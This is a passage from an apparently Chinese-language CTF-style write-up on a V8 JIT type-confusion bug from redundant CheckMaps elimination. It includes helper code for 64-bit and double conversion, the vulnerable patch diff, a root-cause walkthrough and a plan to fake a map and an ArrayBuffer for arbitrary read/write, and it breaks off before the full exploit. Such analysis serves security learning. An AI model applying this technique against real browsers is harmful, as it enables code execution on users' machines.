class="built_in">arguments</span>.length; i++)</span><br><span class="line">                <span class="keyword">if</span> (!(<span class="built_in">arguments</span>[i] <span class="keyword">instanceof</span> Int64))</span><br><span class="line">                    <span class="built_in">arguments</span>[i] = <span class="keyword">new</span> Int64(<span class="built_in">arguments</span>[i]);</span><br><span class="line">            <span class="keyword">return</span> f.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = -n (two's complement)</span></span><br><span class="line">    <span class="keyword">this</span>.assignNeg = operation(<span class="function"><span class="keyword">function</span> <span class="title">neg</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">            bytes[i] = ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, Int64.One);</span><br><span class="line">    &#125;, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a + b</span></span><br><span class="line">    <span class="keyword">this</span>.assignAdd = operation(<span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> cur = a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">            carry = cur &gt; <span class="number">0xff</span> | <span class="number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a - b</span></span><br><span class="line">    <span class="keyword">this</span>.assignSub = operation(<span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> cur = a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">            carry = cur &lt; <span class="number">0</span> | <span class="number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a &amp; b</span></span><br><span class="line">    <span class="keyword">this</span>.assignAnd = operation(<span class="function"><span class="keyword">function</span> <span class="title">and</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            bytes[i] = a.byteAt(i) &amp; b.byteAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new Int64 instance with the same bit representation as the provided double.</span></span><br><span class="line">Int64.fromDouble = <span class="function"><span class="keyword">function</span>(<span class="params">d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> bytes = Struct.pack(Struct.float64, d);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Int64(bytes);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Convenience functions. These allocate a new Int64 to hold the result.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Return -n (two's complement)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Neg</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignNeg(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a + b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAdd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a - b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignSub(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a &amp; b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">And</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAnd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">"0xUNDEFINED"</span>;</span><br><span class="line">    <span class="keyword">var</span> ret = a.toString(<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret.substr(<span class="number">0</span>,<span class="number">2</span>) != <span class="string">"0x"</span>) <span class="keyword">return</span> <span class="string">"0x"</span>+ret;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lower</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the lower 32bit of double x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upper</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the upper 32bit of double x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lowerint</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the lower 32bit of int x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upperint</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the upper 32bit of int x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">combine</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//print(a.toString());</span></span><br><span class="line">    <span class="comment">//print(b.toString());</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//padLeft用于字符串左补位</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">combineint</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(b.toString(<span class="number">16</span>).substr(<span class="number">-8</span>,<span class="number">8</span>) + (a.toString(<span class="number">16</span>)).padLeft(<span class="number">8</span>), <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// based on Long.js by dcodeIO</span></span><br><span class="line">  <span class="comment">// https://github.com/dcodeIO/Long.js</span></span><br><span class="line">  <span class="comment">// License Apache 2</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">_u64</span> </span>&#123;</span><br><span class="line">     <span class="keyword">constructor</span>(hi, lo) &#123;</span><br><span class="line">        <span class="keyword">this</span>.lo_ = lo;</span><br><span class="line">        <span class="keyword">this</span>.hi_ = hi;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     hex() &#123;</span><br><span class="line">        <span class="keyword">var</span> hlo = (<span class="keyword">this</span>.lo_ &lt; <span class="number">0</span> ? (<span class="number">0xFFFFFFFF</span> + <span class="keyword">this</span>.lo_ + <span class="number">1</span>) : <span class="keyword">this</span>.lo_).toString(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">var</span> hhi = (<span class="keyword">this</span>.hi_ &lt; <span class="number">0</span> ? (<span class="number">0xFFFFFFFF</span> + <span class="keyword">this</span>.hi_ + <span class="number">1</span>) : <span class="keyword">this</span>.hi_).toString(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(hlo.substr(<span class="number">0</span>,<span class="number">2</span>) == <span class="string">"0x"</span>) hlo = hlo.substr(<span class="number">2</span>,hlo.length);</span><br><span class="line">        <span class="keyword">if</span>(hhi.substr(<span class="number">0</span>,<span class="number">2</span>) == <span class="string">"0x"</span>) hhi = hhi.substr(<span class="number">2</span>,hji.length);</span><br><span class="line">        hlo = <span class="string">"00000000"</span> + hlo</span><br><span class="line">        hlo = hlo.substr(hlo.length<span class="number">-8</span>, hlo.length);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0x"</span> + hhi + hlo;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     isZero() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.hi_ == <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.lo_ == <span class="number">0</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     equals(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.hi_ == val.hi_ &amp;&amp; <span class="keyword">this</span>.lo_ == val.lo_;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     and(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(<span class="keyword">this</span>.hi_ &amp; val.hi_, <span class="keyword">this</span>.lo_ &amp; val.lo_);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     add(val) &#123;</span><br><span class="line">        <span class="keyword">var</span> a48 = <span class="keyword">this</span>.hi_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> a32 = <span class="keyword">this</span>.hi_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> a16 = <span class="keyword">this</span>.lo_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> a00 = <span class="keyword">this</span>.lo_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">var</span> b48 = val.hi_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> b32 = val.hi_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> b16 = val.lo_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> b00 = val.lo_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">var</span> c48 = <span class="number">0</span>, c32 = <span class="number">0</span>, c16 = <span class="number">0</span>, c00 = <span class="number">0</span>;</span><br><span class="line">        c00 += a00 + b00;</span><br><span class="line">        c16 += c00 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c00 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c16 += a16 + b16;</span><br><span class="line">        c32 += c16 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c16 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c32 += a32 + b32;</span><br><span class="line">        c48 += c32 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c32 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c48 += a48 + b48;</span><br><span class="line">        c48 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64((c48 &lt;&lt; <span class="number">16</span>) | c32, (c16 &lt;&lt; <span class="number">16</span>) | c00);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     addi(h,l) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.add(<span class="keyword">new</span> _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     subi(h,l) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sub(<span class="keyword">new</span> _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     not() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(~<span class="keyword">this</span>.hi_, ~<span class="keyword">this</span>.lo_)</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     neg() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.not().add(<span class="keyword">new</span> _u64(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     sub(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.add(val.neg());</span><br><span class="line">     &#125;;</span><br><span class="line">  </span><br><span class="line">     swap32(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((val &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>) | ((val &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">              ((val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) | ((val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">     &#125;</span><br><span class="line">  </span><br><span class="line">     bswap() &#123;</span><br><span class="line">        <span class="keyword">var</span> lo = swap32(<span class="keyword">this</span>.lo_);</span><br><span class="line">        <span class="keyword">var</span> hi = swap32(<span class="keyword">this</span>.hi_);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(lo, hi);</span><br><span class="line">     &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">var</span> u64 = <span class="function"><span class="keyword">function</span>(<span class="params">hi, lo</span>) </span>&#123; <span class="keyword">return</span> <span class="keyword">new</span> _u64(hi,lo) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这次exp编写中，用到的主要是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Int64.fromDouble(double num);</span><br><span class="line"><span class="keyword">new</span> Int64(int num).asDouble();</span><br></pre></td></tr></table></figure><ul><li><code>Int64.fromDouble(double num)</code><br>Constructs a new Int64 instance with the same bit representation as the provided double.<br>例如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(Int64.fromDouble(1.1));</span><br><span class="line">print(typeof(Int64.fromDouble(1.1)));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x3ff199999999999a</span><br><span class="line">object</span><br></pre></td></tr></table></figure></li><li><code>new Int64(int num).asDouble();</code><br>Return a double whith the same underlying bit representation.<br>例如<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(new Int64(0x3ff199999999999a).asDouble());</span><br><span class="line">print(typeof(new Int64(0x3ff199999999999a).asDouble()));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">1.1000000000000227</span><br><span class="line">number</span><br></pre></td></tr></table></figure></li></ul><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc</span><br><span class="line">index <span class="number">3</span>a40e8d..cb51acc <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/redundancy-elimination.cc</span><br><span class="line">+++ b/src/compiler/redundancy-elimination.cc</span><br><span class="line">@@ <span class="number">-5</span>,<span class="number">6</span> +<span class="number">5</span>,<span class="number">8</span> @@</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/redundancy-elimination.h"</span></span></span><br><span class="line"> </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/node-properties.h"</span></span></span><br><span class="line">+<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/simplified-operator.h"</span></span></span><br><span class="line">+<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/objects-inl.h"</span></span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"> <span class="keyword">namespace</span> internal &#123;</span><br><span class="line">@@ <span class="number">-23</span>,<span class="number">6</span> +<span class="number">25</span>,<span class="number">7</span> @@ <span class="function">Reduction <span class="title">RedundancyElimination::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckHeapObject:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckIf:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckInternalizedString:</span><br><span class="line">+    <span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckNumber:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckReceiver:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckSmi:</span><br><span class="line">@@ <span class="number">-129</span>,<span class="number">6</span> +<span class="number">132</span>,<span class="number">14</span> @@ <span class="function"><span class="keyword">bool</span> <span class="title">IsCompatibleCheck</span><span class="params">(Node <span class="keyword">const</span>* a, Node <span class="keyword">const</span>* b)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckInternalizedString &amp;&amp;</span><br><span class="line">         b-&gt;opcode() == IrOpcode::kCheckString) &#123;</span><br><span class="line">       <span class="comment">// CheckInternalizedString(node) implies CheckString(node)</span></span><br><span class="line">+    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span><br><span class="line">+               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span><br><span class="line">+      <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">+      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">+      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">+      <span class="keyword">if</span> (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">+        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">+      &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>每一个对象都有一个map来标记这个对象的类型，而checkmap就是用来检查这个对象的类型有没有变化的。<br>如果没变的话就可以一直走fast path，否则就要baliout。<br>根据给出的含漏洞的patch可知,JIT优化中的函数调用层次如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">RedundancyElimination::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (node_checks_.Get(node)) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">return</span> ReduceCheckNode(node);</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line"><span class="function">Reduction <span class="title">RedundancyElimination::ReduceCheckNode</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  Node* <span class="keyword">const</span> effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  EffectPathChecks <span class="keyword">const</span>* checks = node_checks_.Get(effect);</span><br><span class="line">  <span class="comment">// If we do not know anything about the predecessor, do not propagate just yet</span></span><br><span class="line">  <span class="comment">// because we will have to recompute anyway once we compute the predecessor.</span></span><br><span class="line">  <span class="keyword">if</span> (checks == <span class="literal">nullptr</span>) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="comment">// See if we have another check that dominates us.</span></span><br><span class="line">  <span class="keyword">if</span> (Node* check = checks-&gt;LookupCheck(node)) &#123;</span><br><span class="line">    ReplaceWithValue(node, check);</span><br><span class="line">    <span class="keyword">return</span> Replace(check);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line">Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (Check <span class="keyword">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (IsCompatibleCheck(check-&gt;node, node)) &#123;</span><br><span class="line">      DCHECK(!check-&gt;node-&gt;IsDead());</span><br><span class="line">      <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsCompatibleCheck</span><span class="params">(Node <span class="keyword">const</span>* a, Node <span class="keyword">const</span>* b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a-&gt;op() != b-&gt;op()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span><br><span class="line">               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span><br><span class="line">      <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">      <span class="keyword">if</span> (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在Reduce里遇到CheckMaps的时候</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">return</span> ReduceCheckNode(node);</span><br></pre></td></tr></table></figure><p>为了找到最优的dominates，会去遍历其他的check</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Check <span class="keyword">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br></pre></td></tr></table></figure><p>如果找到其他的CheckMaps的话，会检查是否“兼容”，会去看它们的maps，如果第一个检查已经包含第二个检查的话，就会把第二个检查给去掉。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Node* check = checks-&gt;LookupCheck(node)) &#123;</span><br><span class="line">    ReplaceWithValue(node, check);</span><br><span class="line">    ...</span><br><span class="line">    Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (IsCompatibleCheck(check-&gt;node, node)) &#123;</span><br><span class="line">            DCHECK(!check-&gt;node-&gt;IsDead());</span><br><span class="line">            <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>type confusion可以让我们得到对于用户空间任何object的读写权限，可以将任意一个对象的指针当成一个double读出来，也可以将任意一个double当成一个对象的指针写进去，这样我们就可以在一个地址伪造一个对象。</p><p>通过type confusion去fake map，fake ArrayBuffer，然后通过改我们fake的ArrayBuffer的BackingStore得到任意地址读写的原语。</p><h3 id="fake-map-prototype-amp-amp-constructor"><a href="#fake-map-prototype-amp-amp-constructor" class="headerlink" title="fake map prototype&amp;&amp;constructor"></a>fake map prototype&amp;&amp;constructor</h3><p><strong>PS.事实上这步可能不需要。只是当时学习别人exp的时候写的</strong><br>通过type confusion去leak 